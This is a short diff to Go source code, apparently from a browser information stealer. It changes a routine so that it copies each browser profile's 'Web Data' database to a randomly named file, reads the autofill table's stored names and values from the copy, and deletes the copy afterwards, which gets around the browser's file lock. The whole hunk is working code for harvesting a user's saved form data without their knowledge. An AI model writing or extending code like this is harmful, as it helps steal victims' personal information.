@@ -33,11 +33,14 @@ func Get() string {
 				continue
 			}
 			path = path + "\\" + profile
-			db, err := sql.Open("sqlite3", path+"\\Web Data")
+			copy_path := path + "\\Web Data" + util.RandomName()
+			util.CopyFileKDOT(path+"\\Web Data", copy_path)
+			db, err := sql.Open("sqlite3", copy_path)
 			if err != nil {
 				continue
 			}
 			defer db.Close()
+			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT name, value, value_lower, date_created, date_last_used, count FROM autofill")
 			if err != nil {
